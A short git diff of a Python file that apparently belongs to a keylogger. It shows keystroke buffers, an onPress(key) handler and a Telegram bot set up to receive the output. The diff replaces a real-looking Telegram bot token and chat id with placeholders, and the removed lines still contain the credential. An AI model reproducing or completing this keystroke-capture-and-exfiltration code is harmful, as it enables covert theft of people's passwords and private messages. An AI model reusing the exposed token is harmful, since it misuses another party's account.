@@ -7,8 +7,8 @@ import os
 
 fullog = ''
 words = ''
-bot_token = '7317534517:AAGc_xjKku8_hwLmuTDrMHyoUhHZ9X-E8JY'
-chat_id = '6005215116'
+bot_token = 'token'
+chat_id = 'id'
 bot = telebot.TeleBot(bot_token)
 
 def onPress(key):
